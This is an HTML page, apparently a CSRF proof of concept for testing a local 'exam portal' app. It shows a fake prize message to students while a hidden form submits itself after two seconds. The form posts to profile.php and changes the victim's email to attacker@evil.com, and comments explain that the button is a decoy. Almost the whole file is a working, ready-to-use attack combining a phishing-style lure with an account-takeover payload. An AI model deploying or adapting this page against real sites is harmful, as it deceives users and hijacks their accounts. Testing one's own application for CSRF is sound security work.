<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations! You've Won!</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 100%;
        }
        h1 {
            color: #2d3748;
            margin-bottom: 10px;
        }
        p {
            color: #718096;
            font-size: 1.1rem;
            line-height: 1.6;
        }
        .gift-icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% {transform: translateY(0);}
            40% {transform: translateY(-20px);}
            60% {transform: translateY(-10px);}
        }
        .btn {
            background-color: #3182ce;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            text-decoration: none;
            display: inline-block;
        }
        /* Hide the actual form so the user doesn't see it */
        #pwn {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="gift-icon">🎁</div>
        <h1>Congratulations!</h1>
        <p>You have been selected as our <strong>Lucky Student of the Day!</strong></p>
        <p>Click the button below to claim your exclusive exam portal premium badge.</p>
        
        <!-- This button is a decoy. The real attack happens in the background. -->
        <button class="btn" onclick="alert('Claiming reward...')">Claim Reward</button>
    </div>

    <!-- THE CSRF ATTACK FORM -->
    <!-- This form targets your profile.php endpoint -->
    <form id="pwn" action="http://localhost/profile.php" method="POST">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>

    <!-- THE SCRIPT THAT FIRES THE ATTACK AUTOMATICALLY -->
    <script>
        // Wait 2 seconds so the user sees the "Congratulations" page first
        setTimeout(function() {
            document.getElementById('pwn').submit();
            console.log("CSRF Payload Sent!");
        }, 2000);
    </script>

</body>
</html>
